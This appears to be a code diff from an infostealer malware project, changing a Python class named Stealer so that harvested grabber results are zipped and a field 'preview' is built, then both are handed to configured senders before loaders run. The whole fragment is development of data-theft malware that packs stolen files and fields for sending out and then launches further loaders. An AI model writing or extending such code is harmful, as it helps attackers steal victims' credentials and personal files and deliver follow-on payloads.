@@ -235,10 +235,11 @@ class Stealer(Thread):
 
                 results += grabber_results
 
-            data = self.__storage.create_zip([file for files in results if files for file in files])
+            data = self.__storage.create_zip([file for data in results if data for file in data.files])
+            preview = self.__storage.create_preview([field for data in results if data for field in data.fields])
 
             for sender in self.__senders:
-                sender.run(self.__config.ZipName, data)
+                sender.run(self.__config.ZipName, data, preview)
 
             for loader in self.__loaders:
                 loader.run()
